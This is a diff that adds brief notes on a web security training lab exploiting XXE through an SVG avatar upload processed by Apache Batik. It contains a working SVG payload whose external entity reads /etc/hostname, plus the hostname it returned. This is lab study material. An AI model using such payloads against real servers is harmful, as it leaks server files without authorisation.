@@ -1,0 +1,15 @@
+Lab: Exploiting XXE via image file upload
+Analysis: Allow users attach avatars to comments and uses the Apache Batik library to process avatar image files.
+Task: Upload an image that displays the contents of the /etc/hostname
+
+Apache Batik: Java-based toolkit that provides a set of core modules for working with Scalable Vector Graphics (SVG) images. It allows applications and applets to display, generate, and manipulate SVG content.
+
+Solution:
+
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+xmlns="http://www.w3.org/2000/svg": SVG namespace – required for proper rendering in browsers.
+
+xmlns:xlink="http://www.w3.org/1999/xlink": Namespace for XLink, used for linking resources in SVG
+
+Result: e631a6459caf
